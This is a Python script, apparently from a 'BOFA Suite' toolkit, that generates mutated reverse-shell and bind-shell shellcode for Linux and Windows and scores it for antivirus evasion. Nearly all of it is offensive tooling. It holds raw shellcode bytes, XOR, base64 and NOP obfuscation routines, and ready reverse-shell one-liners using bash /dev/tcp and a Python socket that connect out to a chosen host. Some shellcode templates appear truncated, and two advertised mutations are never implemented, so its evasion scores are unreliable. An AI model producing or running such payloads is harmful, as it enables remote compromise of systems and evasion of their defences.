
#!/usr/bin/env python3
"""
AI Payload Mutator - Adaptive Shellcode Generator
Developed by @descambiado for BOFA Suite

Revolutionary payload mutation engine that creates unique shellcodes
using semantic mutations and intelligent obfuscation techniques.
"""

import os
import sys
import random
import base64
import binascii
import argparse
from datetime import datetime

class AIPayloadMutator:
    def __init__(self):
        self.version = "1.0.0"
        self.author = "@descambiado"
        
        # Base shellcode templates for different architectures
        self.shellcode_templates = {
            'linux_x64': {
                'reverse_shell': b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05',
                'bind_shell': b'\x6a\x29\x58\x6a\x01\x5e\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\x68\x11\x5c',
            },
            'windows_x64': {
                'reverse_shell': b'\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2',
                'bind_shell': b'\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2',
            }
        }
        
        # Mutation techniques
        self.mutation_techniques = [
            'xor_encoding',
            'base64_encoding', 
            'variable_substitution',
            'instruction_reordering',
            'nop_insertion',
            'register_substitution'
        ]
        
    def print_banner(self):
        print("\n" + "="*60)
        print("🧬 AI PAYLOAD MUTATOR - Adaptive Shellcode Generator")
        print("="*60)
        print(f"Version: {self.version} | Author: {self.author}")
        print("Revolutionary mutation engine for evasion testing")
        print("="*60)
        
    def xor_encode(self, shellcode, key=None):
        """XOR encoding with random or specified key"""
        if key is None:
            key = random.randint(1, 255)
        
        encoded = bytearray()
        for byte in shellcode:
            encoded.append(byte ^ key)
            
        return bytes(encoded), key
        
    def base64_encode_segments(self, shellcode):
        """Encode shellcode in segments to avoid pattern detection"""
        segment_size = random.randint(4, 8)
        segments = []
        
        for i in range(0, len(shellcode), segment_size):
            segment = shellcode[i:i+segment_size]
            encoded_segment = base64.b64encode(segment).decode()
            segments.append(encoded_segment)
            
        return segments
        
    def insert_nops(self, shellcode, nop_count=None):
        """Insert NOP instructions at random positions"""
        if nop_count is None:
            nop_count = random.randint(1, 10)
            
        nop_byte = b'\x90'  # x86 NOP instruction
        positions = sorted(random.sample(range(len(shellcode)), 
                                       min(nop_count, len(shellcode))))
        
        result = bytearray(shellcode)
        for i, pos in enumerate(positions):
            result.insert(pos + i, nop_byte[0])
            
        return bytes(result)
        
    def substitute_variables(self, template_code, target_ip, target_port):
        """Generate polymorphic code with variable substitution"""
        variable_names = [
            'target_addr', 'dest_ip', 'remote_host', 'server_addr',
            'connect_ip', 'endpoint', 'destination', 'host_target'
        ]
        
        port_names = [
            'target_port', 'dest_port', 'remote_port', 'server_port',
            'connect_port', 'endpoint_port', 'service_port', 'listen_port'
        ]
        
        ip_var = random.choice(variable_names)
        port_var = random.choice(port_names)
        
        # Generate polymorphic shell command
        shell_variants = [
            f'/bin/bash -i >& /dev/tcp/{target_ip}/{target_port} 0>&1',
            f'bash -c "exec 5<>/dev/tcp/{target_ip}/{target_port};cat <&5|while read line; do $line 2>&5 >&5; done"',
            f'python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'{target_ip}\',{target_port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\'/bin/sh\',\'-i\']);"'
        ]
        
        return random.choice(shell_variants)
        
    def generate_mutated_payload(self, arch, payload_type, target_ip, target_port, mutations=3):
        """Generate a mutated payload using multiple techniques"""
        if arch not in self.shellcode_templates:
            return None, "Unsupported architecture"
            
        if payload_type not in self.shellcode_templates[arch]:
            return None, "Unsupported payload type"
            
        base_shellcode = self.shellcode_templates[arch][payload_type]
        mutated_payload = base_shellcode
        applied_mutations = []
        
        # Apply random mutations
        selected_mutations = random.sample(self.mutation_techniques, 
                                         min(mutations, len(self.mutation_techniques)))
        
        for mutation in selected_mutations:
            if mutation == 'xor_encoding':
                mutated_payload, xor_key = self.xor_encode(mutated_payload)
                applied_mutations.append(f"XOR encoding (key: {xor_key})")
                
            elif mutation == 'base64_encoding':
                segments = self.base64_encode_segments(mutated_payload)
                applied_mutations.append(f"Base64 segmented encoding ({len(segments)} segments)")
                
            elif mutation == 'nop_insertion':
                mutated_payload = self.insert_nops(mutated_payload)
                applied_mutations.append("NOP sled insertion")
                
            elif mutation == 'variable_substitution':
                shell_command = self.substitute_variables("", target_ip, target_port)
                applied_mutations.append("Variable name substitution")
                
        return {
            'original_size': len(base_shellcode),
            'mutated_size': len(mutated_payload),
            'shellcode_hex': binascii.hexlify(mutated_payload).decode(),
            'shellcode_c': self.format_c_array(mutated_payload),
            'shellcode_python': self.format_python_bytes(mutated_payload),
            'mutations_applied': applied_mutations,
            'evasion_score': self.calculate_evasion_score(applied_mutations),
            'generation_time': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }, None
        
    def format_c_array(self, shellcode):
        """Format shellcode as C array"""
        hex_bytes = [f"\\x{byte:02x}" for byte in shellcode]
        formatted = ''.join(hex_bytes)
        return f'unsigned char shellcode[] = "{formatted}";'
        
    def format_python_bytes(self, shellcode):
        """Format shellcode as Python bytes"""
        hex_bytes = [f"\\x{byte:02x}" for byte in shellcode]
        formatted = ''.join(hex_bytes)
        return f'shellcode = b"{formatted}"'
        
    def calculate_evasion_score(self, mutations):
        """Calculate an evasion score based on applied mutations"""
        base_score = 10
        mutation_scores = {
            'XOR encoding': 25,
            'Base64 segmented encoding': 20,
            'NOP sled insertion': 15,
            'Variable name substitution': 30,
            'Instruction reordering': 35,
            'Register substitution': 40
        }
        
        score = base_score
        for mutation in mutations:
            for key, value in mutation_scores.items():
                if key in mutation:
                    score += value
                    
        return min(score, 100)  # Cap at 100
        
    def save_payload(self, payload_data, filename):
        """Save generated payload to file"""
        try:
            with open(filename, 'w') as f:
                f.write("# AI Payload Mutator - Generated Payload\n")
                f.write(f"# Generated: {payload_data['generation_time']}\n")
                f.write(f"# Evasion Score: {payload_data['evasion_score']}/100\n\n")
                
                f.write("# Mutations Applied:\n")
                for mutation in payload_data['mutations_applied']:
                    f.write(f"# - {mutation}\n")
                f.write("\n")
                
                f.write("# Hexadecimal Format:\n")
                f.write(f"{payload_data['shellcode_hex']}\n\n")
                
                f.write("# C Array Format:\n")
                f.write(f"{payload_data['shellcode_c']}\n\n")
                
                f.write("# Python Bytes Format:\n")
                f.write(f"{payload_data['shellcode_python']}\n")
                
            return True
        except Exception as e:
            print(f"Error saving payload: {e}")
            return False

def main():
    parser = argparse.ArgumentParser(description="AI Payload Mutator - Adaptive Shellcode Generator")
    parser.add_argument('-a', '--arch', choices=['linux_x64', 'windows_x64'], 
                       default='linux_x64', help='Target architecture')
    parser.add_argument('-t', '--type', choices=['reverse_shell', 'bind_shell'],
                       default='reverse_shell', help='Payload type')
    parser.add_argument('--ip', required=True, help='Target IP address')
    parser.add_argument('--port', type=int, required=True, help='Target port')
    parser.add_argument('-m', '--mutations', type=int, default=3,
                       help='Number of mutations to apply (1-6)')
    parser.add_argument('-o', '--output', help='Output filename')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    
    args = parser.parse_args()
    
    mutator = AIPayloadMutator()
    mutator.print_banner()
    
    print(f"\n🎯 Generating mutated payload...")
    print(f"   Architecture: {args.arch}")
    print(f"   Payload Type: {args.type}")
    print(f"   Target: {args.ip}:{args.port}")
    print(f"   Mutations: {args.mutations}")
    
    payload_data, error = mutator.generate_mutated_payload(
        args.arch, args.type, args.ip, args.port, args.mutations
    )
    
    if error:
        print(f"\n❌ Error: {error}")
        return 1
        
    print(f"\n✅ Payload generated successfully!")
    print(f"   Original Size: {payload_data['original_size']} bytes")
    print(f"   Mutated Size: {payload_data['mutated_size']} bytes")
    print(f"   Evasion Score: {payload_data['evasion_score']}/100")
    
    print(f"\n🧬 Applied Mutations:")
    for mutation in payload_data['mutations_applied']:
        print(f"   • {mutation}")
        
    if args.verbose:
        print(f"\n📋 Generated Shellcode (hex):")
        print(f"   {payload_data['shellcode_hex']}")
        
        print(f"\n🔧 C Array Format:")
        print(f"   {payload_data['shellcode_c']}")
        
        print(f"\n🐍 Python Format:")
        print(f"   {payload_data['shellcode_python']}")
    
    if args.output:
        if mutator.save_payload(payload_data, args.output):
            print(f"\n💾 Payload saved to: {args.output}")
        else:
            print(f"\n❌ Failed to save payload")
            
    print(f"\n⚠️  ETHICAL USE ONLY - For authorized testing and education")
    print(f"   This tool is for security research and authorized penetration testing")
    
    return 0

if __name__ == "__main__":
    sys.exit(main())
